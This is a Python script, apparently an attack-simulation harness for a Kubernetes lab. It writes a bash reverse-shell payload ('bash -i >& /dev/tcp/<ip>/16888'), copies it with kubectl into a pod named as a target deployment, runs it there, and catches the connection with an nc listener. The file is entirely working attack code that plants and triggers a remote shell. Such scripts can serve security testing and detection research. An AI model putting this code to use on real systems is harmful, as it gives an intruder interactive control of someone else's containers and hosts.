import subprocess
import time
import signal
import pexpect

from core_package import get_pod_internal_ip


def run_nc_command():
    process = subprocess.Popen(['nc', '-lvvp', '16888'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    try:
        while True:
            output = process.stdout.readline().decode()
            print(output, end='')
            keywords = ['received', 'Connection from', 'connect to']
            if any(keyword in output for keyword in keywords):
                print("\033[92m>>监听到shell，5s后终止进程\033[0m")
                break
        time.sleep(5)
        process.terminate()
    except Exception as e:
        print("\033[92m>>Error occurred:\033[0m", str(e))
        process.terminate()
    finally:
        subprocess.call(['rm', '-rf', 'test1.sh'])


# 这个方法用来复制文件到pod
def copy_file_to_pod():
    get_pods_command = "kubectl get pod -n xinfan"
    process = subprocess.Popen(get_pods_command.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()
    if error:
        print(">>Error occurred:", error)
        return
    pod_name = None
    for line in output.decode().split('\n'):
        if "centosssh-target-deployment" in line:
            pod_name = line.split()[0]
            break
    if not pod_name:
        print(">>No pod found with 'centosssh-target-deployment' in its name")
        return
    cp_command = f"kubectl cp test1.sh {pod_name}:/test1.sh -n xinfan"
    process = subprocess.Popen(cp_command.split(), stdout=subprocess.PIPE)
    output, error = process.communicate()
    if error:
        print(">>Error occurred:", error)
    else:
        print("\033[92m>>文件复制成功\033[0m")
    exec_command = "kubectl exec -it {} -n xinfan /bin/bash".format(pod_name)
    child = pexpect.spawn(exec_command)
    command_to_execute_in_shell = "./test1.sh"
    child.sendline(command_to_execute_in_shell)
    print("\033[92m>>Bash脚本执行成功\033[0m")
    time.sleep(2)
    child.kill(signal.SIGINT)
    return


# 这个方法用来创建bash脚本
def create_bash_script(exec_pod_name):
    command = f"echo '#!/bin/bash\n\nbash -i >& /dev/tcp/{get_pod_internal_ip(exec_pod_name)}/16888 0>&1' > test1.sh"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    output, error = process.communicate()
    if error:
        print(">>Error occurred:", error)
    else:
        print("\033[92m>>Bash脚本写入成功\033[0m")
    chmod_command = "chmod +x test1.sh"
    process = subprocess.Popen(chmod_command, shell=True, stdout=subprocess.PIPE)
    output, error = process.communicate()

    if error:
        print(">>Error occurred when changing file permissions:", error)
    else:
        print("\033[92m>>文件执行权限授予成功\033[0m")



